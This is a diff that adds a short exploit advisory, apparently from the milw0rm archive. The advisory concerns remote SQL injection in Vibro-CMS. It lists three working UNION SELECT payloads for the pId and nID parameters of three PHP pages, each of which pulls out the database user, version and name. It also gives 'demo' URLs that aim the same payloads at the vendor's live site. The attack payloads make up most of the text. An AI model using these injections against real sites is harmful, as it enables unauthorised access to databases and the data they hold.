@@ -1,0 +1,26 @@
+/*
+   -------------------------------------------------------
+   Vibro-CMS Multiple Remote SQL Injection Vulnerabilities
+   -------------------------------------------------------
+   Discovered By StAkeR[at]hotmail[dot]it
+   http://www.niclor.net/prodotti/Vibro-CMS
+   -------------------------------------------------------
+
+   * Remote SQL Injection
+   * Note: Works Regardless PHP.ini Settings
+   
+   - view_pagina.php?pId=1 union select null,concat_ws(0x3a,user(),version(),database()),null/*
+   - view_sub-pagina.php?pId=1 union select 0,concat(database(),0x3a,user()),version(),3/*
+   - view_news.php?nID=4 union select 0,0,user(),1,2,3,4,database(),6,7,8,version(),0/*
+   
+   * Demo
+   
+   - http://www.niclor.net/prodotti/Vibro-CMS/view_pagina.php?pId=1 union select 0,concat_ws(0x3a,user(),version(),database()),0/*
+   - http://www.niclor.net/prodotti/Vibro-CMS/ view_sub-pagina.php?pId=1 union select 0,concat(database(),0x3a,user()),version(),3/*
+   - http://www.niclor.net/prodotti/Vibro-CMS/view_news.php?nID=4 union select 0,0,user(),1,2,3,4,database(),6,7,8,version(),0/*
+   
+   
+
+*/
+
+# milw0rm.com [2008-11-04]
